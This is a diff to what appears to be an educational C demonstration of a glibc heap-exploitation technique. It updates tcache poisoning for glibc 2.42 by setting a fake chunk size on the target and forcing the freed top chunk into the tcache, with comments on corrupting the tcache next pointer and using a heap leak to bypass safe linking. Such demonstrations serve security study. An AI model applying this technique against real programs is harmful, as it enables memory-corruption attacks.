@@ -54,7 +54,7 @@
  */
 int main() {
   size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
-  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
+  long win[2] __attribute__ ((aligned (0x10)));
   // disable buffering
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stdin, NULL, _IONBF, 0);
@@ -74,7 +74,10 @@ int main() {
   printf("target tcache top size = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);
 
   // target is malloc aligned 0x10
-  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;
+  // since this patch in glibc-2.42: https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/
+  // the size of the target chunk must be set
+  target = (size_t) &win[0];
+  win[1] = 0x41;
 
   // probe the current size of the top_chunk,
   // can be skipped if it is already known or predictable
@@ -144,6 +147,10 @@ int main() {
 
   // free the previous top_chunk
   heap_ptr = malloc(SIZE_3);
+
+  // in glibc-2.42, the freed chunk will be directly added into fastbin, which is not
+  // as good as in tcachebin, let's force it to be in tcache by taking it out and free it
+  free(malloc(SIZE_1));
 
   // corrupt next ptr into pointing to target
   // use a heap leak to bypass safe linking (GLIBC >= 2.32)
